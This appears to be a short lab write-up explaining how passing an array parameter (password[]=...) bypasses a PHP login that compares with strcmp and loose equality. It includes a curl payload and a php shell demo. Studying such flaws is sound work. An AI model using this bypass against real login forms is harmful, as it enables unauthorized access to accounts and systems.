The first thing I did was go to the documentation page for php's strcmp
function. I've been referring to php's documentation for a lot of these
problems, it's a simple google search:

https://www.php.net/manual/en/function.strcmp.php

In one of the comments a user told of this vulnerability:

curl -d password[]=wrong http://andersk.scripts.mit.edu/strcmp.php

This takes advantage of some peculiar syntax in php. This will both create a key
called password and assign to it an array with wrong as a value. In my case I
just typed ?passwd[]="" at the end of the url in my web browser for the lab web
page.

I opened up a php shell, this is essentially the comparison taking place.

php > echo strcmp(array(), "") == 0 ? "yes" : "no";
echo strcmp(array(), "") == 0 ? "yes" : "no";
PHP Warning:  strcmp() expects parameter 1 to be string, array given in php shell code on line 1
yes
php > echo strcmp(array(), "") == 0 ? "yes" : "no";
